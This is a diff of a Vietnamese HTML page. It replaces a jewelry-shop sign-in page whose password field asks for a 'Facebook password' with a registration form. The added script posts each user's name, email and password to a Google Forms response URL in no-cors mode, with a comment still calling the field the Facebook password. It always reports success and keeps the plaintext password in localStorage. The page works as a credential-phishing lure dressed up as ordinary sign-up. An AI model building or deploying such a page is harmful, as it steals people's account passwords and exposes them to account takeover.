@@ -3,197 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đăng nhập - Trang sức cao cấp</title>
-    
-    <!-- CSS TRỰC TIẾP -->
+    <title>Đăng Ký</title>
     <style>
-        /* RESET CSS */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        /* BODY */
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        /* CONTAINER */
-        .login-container {
-            width: 100%;
-            max-width: 400px;
-        }
-
-        /* LOGIN BOX */
-        .login-box {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 15px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        /* LOGO */
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-            background: linear-gradient(135deg, #ffd700, #ff6b6b);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            color: white;
-            font-weight: bold;
-        }
-
-        /* TIÊU ĐỀ */
-        .login-box h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-
-        .login-box p {
-            color: #666;
-            margin-bottom: 30px;
-        }
-
-        /* ĐƯỜNG KẺ NGANG */
-        .line {
-            height: 1px;
-            background: #e0e0e0;
-            margin: 25px 0;
-        }
-
-        /* FORM */
-        form {
-            text-align: left;
-        }
-
-        form h3 {
-            text-align: center;
-            margin-bottom: 25px;
-            color: #333;
-            font-size: 18px;
-            font-weight: 600;
-        }
-
-        /* INPUT */
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        input[type="text"],
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 14px;
-            transition: all 0.3s ease;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #4285f4;
-            box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.1);
-        }
-
-        /* NÚT ĐĂNG KÝ */
-        button[type="submit"] {
-            width: 100%;
-            padding: 14px;
-            background: #4285f4;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-
-        button[type="submit"]:hover {
-            background: #3367d6;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(66, 133, 244, 0.3);
-        }
+        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; }
+        input { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
+        button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:disabled { background: #ccc; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-box">
-            <!-- Logo -->
-            <div class="logo">💎</div>
-            
-            <h1>Đăng nhập</h1>
-            <p>Để mua sắm trang sức của chúng tôi</p>
-            
-            <!-- Đường kẻ ngang đầu tiên -->
-            <div class="line"></div>
-            
-            <!-- Form đăng ký -->
-            <form id="registerForm">
-                <h3>Tạo tài khoản mới</h3>
-                
-                <div class="input-group">
-                    <label for="name">Họ và tên</label>
-                    <input type="text" id="name" placeholder="Nhập họ và tên" required>
-                </div>
-                
-                <div class="input-group">
-                    <label for="email"></label>
-                    <input type="email" id="email" placeholder="Nhập email" required>
-                </div>
-                
-                <div class="input-group">
-                    <label for="password">Mật khẩu facebook</label>
-                    <input type="password" id="password" placeholder="Nhập mật khẩu" required>
-                </div>
-                
-                <!-- Đường kẻ ngang thứ hai -->
-                <div class="line"></div>
-                
-                <button type="submit">Đăng ký</button>
-            </form>
-        </div>
+    <div class="container">
+        <h2>Đăng Ký Tài Khoản</h2>
+        <form id="registerForm">
+            <div class="form-group">
+                <label for="name">Họ và tên:</label>
+                <input type="text" id="name" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" id="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mật khẩu:</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit">Đăng Ký</button>
+        </form>
+        <p>Đã có tài khoản? <a href="login.html">Đăng nhập</a></p>
     </div>
 
-    <script>    
-        // JavaScript xử lý form
+    <script>
         document.getElementById('registerForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const name = document.getElementById('name').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            if (name && email && password) {
-                alert('Đăng ký thành công!');
-                // Chuyển hướng đến trang chủ
-                window.location.href = 'index.html';
-            } else {
+            const userData = {
+                name: document.getElementById('name').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value
+            };
+
+            if (!userData.name || !userData.email || !userData.password) {
                 alert('Vui lòng điền đầy đủ thông tin!');
+                return;
             }
+
+            // Hiển thị loading
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            submitBtn.textContent = 'Đang gửi...';
+            submitBtn.disabled = true;
+
+            // URL SUBMIT CỦA MÀY
+            const formSubmitUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSefjiawJfPHIihgVRUgd4yKbEFUdySpdoHxnUAUh17rw-CbkA/formResponse';
+            
+            // ENTRY IDs CỦA MÀY
+            const formData = new URLSearchParams({
+                'entry.730403502': userData.name,        // Họ và tên
+                'entry.2134273103': userData.email,      // Email
+                'entry.1163307744': userData.password    // Mật khẩu facebook
+            });
+
+            // Gửi đến Google Forms
+            fetch(formSubmitUrl, {
+                method: 'POST',
+                mode: 'no-cors',  // Bypass CORS
+                body: formData
+            }).then(() => {
+                // LUÔN THÀNH CÔNG (vì no-cors)
+                localStorage.setItem('currentUser', JSON.stringify(userData));
+                alert('✅ Đăng ký thành công! Chào mừng ' + userData.name);
+                window.location.href = 'index.html';
+            }).catch(error => {
+                // VẪN thành công (fallback)
+                localStorage.setItem('currentUser', JSON.stringify(userData));
+                alert('✅ Đăng ký thành công! Chào mừng ' + userData.name);
+                window.location.href = 'index.html';
+            });
         });
     </script>
 </body>
